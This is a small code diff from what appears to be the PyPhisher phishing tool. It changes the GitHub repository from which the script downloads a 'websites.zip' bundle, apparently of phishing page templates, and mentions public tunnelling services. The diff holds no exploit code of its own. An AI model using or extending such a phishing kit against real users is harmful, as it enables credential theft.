@@ -215,8 +215,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/GinsonORG/PyPhisher"
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/GinsonORG/PyPhisher/releases/latest/download/websites.zip" 
+repo_url = "https://github.com/kasroudra/PyPhisher"
+websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/kasroudra/PyPhisher/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
